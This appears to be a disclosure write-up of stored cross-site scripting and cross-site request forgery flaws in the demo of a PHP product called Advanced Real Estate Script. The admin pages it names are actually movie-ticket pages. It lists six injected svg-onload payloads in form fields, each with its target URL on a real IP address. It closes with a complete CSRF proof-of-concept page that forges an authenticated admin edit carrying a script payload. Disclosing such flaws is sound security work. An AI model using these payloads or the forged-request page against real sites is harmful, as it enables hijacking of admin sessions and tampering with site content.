### Advanced Real Estate Script   XSS/CSRF

Well, when I pentest the official demo site of Advanced Real Estate Script, I found some vulnerabilities here.


#### XSS:

There're some stored-xss in this system, for example:

##### XSS1


```
http://198.38.86.159/~dineshkumarwork/demo/movie/admin/sitesettings.php
```

POST para:
```
------WebKitFormBoundaryzlMIDdRcppEeHLfc
Content-Disposition: form-data; name="keyword"

Movie Ticket booking'"><svg/onload=alert(/sxss/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss1.png)

##### XSS2

```
http://198.38.86.159/~dineshkumarwork/demo/movie/admin/manageownerlist.php?edit&usrid=51
```
POST para:
```
------WebKitFormBoundaryl1hkCrSGo6aWqBcA
Content-Disposition: form-data; name="contact"

9500702882'"><svg/onload=alert(/sxss2/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss2.png)

##### XSS3

```
http://198.38.86.159/~dineshkumarwork/demo/movie/admin/eventlist.php?edit&eventid=45
```

POST para:
```
------WebKitFormBoundaryMGILA7nm2cy2SRx1
Content-Disposition: form-data; name="cast"

sivakarthikeyan'"><svg/onload=prompt(/sxss3/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss3.png)

##### XSS4

POST para:
```
------WebKitFormBoundarybSFVeH6LrfH6zOSG
Content-Disposition: form-data; name="moviename"

Tamizhan da Ennalum'"><svg/onload=alert(/sxss4/)><'"


```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss4.png)


##### XSS5

```
http://198.38.86.159/~dineshkumarwork/demo/movie/admin/snacks_edit.php?sid=8
```


POST para:
```
------WebKitFormBoundaryfHHKnTbHD7iASd0w
Content-Disposition: form-data; name="snacks_name"

fsdfd'"><svg/onload=prompt(/sxss6/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss5.png)



##### XSS6

```
http://198.38.86.159/~dineshkumarwork/demo/movie/admin/newsedit.php?newsid=7
```

POST para:
```
------WebKitFormBoundaryYD6kA6UVdLUiuSCp
Content-Disposition: form-data; name="newstitle"

News1'"><svg/onload=alert(/sxss7/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss6.png)


#### CSRF:

Because of no protection here, we can use csrf to attack users, or change something sensitively into the panel directly.
By the way ,I just found no protection in the user panel here.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/198.38.86.159\/~dineshkumarwork\/demo\/movie\/admin\/movieedit.php?movieid=134", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundarybSFVeH6LrfH6zOSG");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"moviename\"\r\n" + 
          "\r\n" + 
          "Tamizhan da Ennalum\'\"\x3e\x3csvg/onload=alert(/sxss4/)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"mov_id\"\r\n" + 
          "\r\n" + 
          "134\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"mov_img\"\r\n" + 
          "\r\n" + 
          "movie06122017-688.jpg\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"ban_img\"\r\n" + 
          "\r\n" + 
          "banner06122017-395.jpg\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"language\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"actor\"\r\n" + 
          "\r\n" + 
          "vaishali, vaisnavi,\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"musicdirector\"\r\n" + 
          "\r\n" + 
          "Manimaran\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"director\"\r\n" + 
          "\r\n" + 
          "Vignesh\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"producer\"\r\n" + 
          "\r\n" + 
          "Winston\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"runtime\"\r\n" + 
          "\r\n" + 
          "2\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"runmints\"\r\n" + 
          "\r\n" + 
          "6\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"trailerlink\"\r\n" + 
          "\r\n" + 
          "www.phpscriptsmall.com\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"trailerlink2\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "\x3cp\x3efds\x3c/p\x3e\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"rating\"\r\n" + 
          "\r\n" + 
          "U\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"movieimage\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"bannerimage\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"release_date\"\r\n" + 
          "\r\n" + 
          "2017-12-06\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"end_date\"\r\n" + 
          "\r\n" + 
          "2017-12-09\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Submit\r\n" + 
          "------WebKitFormBoundarybSFVeH6LrfH6zOSG--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>



```

